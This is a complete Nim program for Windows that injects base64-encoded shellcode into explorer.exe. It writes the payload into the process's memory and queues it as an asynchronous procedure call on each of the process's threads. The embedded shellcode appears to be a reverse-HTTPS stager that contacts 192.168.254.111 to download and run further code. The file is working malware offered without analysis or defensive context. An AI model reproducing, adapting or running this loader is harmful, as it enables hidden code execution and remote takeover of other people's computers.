import base64, endians
import winim
import winim/lean

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))


proc apc_queue[byte](shellcode: openArray[byte]): void =
  var entry: PROCESSENTRY32
  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  var threadEntry: THREADENTRY32
  threadEntry.dwSize = cast[DWORD](sizeof(THREADENTRY32))
  var hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
  var targetHandle = hSnapshot
  defer: CloseHandle(targetHandle)
  let processName = r"explorer.exe"
  var processEntry: PROCESSENTRY32
  if Process32First(hSnapshot, addr entry):
    while Process32Next(hSnapshot, addr entry):
      if entry.szExeFile.toString == processName:
        processEntry = entry
  
  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID)
  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
  var bytesWritten: SIZE_T
  WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
  var op: DWORD
  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr op)
  var threadIds: seq[int] = @[]   
  if Thread32First(hSnapshot, addr threadEntry):
    while Thread32Next(hSnapshot, addr threadEntry):
      if threadEntry.th32OwnerProcessID == processEntry.th32ProcessID:
        threadIds.add(threadEntry.th32ThreadID)
  for threadId in threadIds:
    let tHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, cast[DWORD](threadId))
    var apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr)
    QueueUserAPC(cast[PAPCFUNC](apcRoutine), tHandle, cast[ULONG_PTR](NULL))
  

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8veTZEagA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzUuMCkNCgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWABBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTExAAAAAAA="
  let shellcode = toByteSeq(decode(enc))
  apc_queue(shellcode)

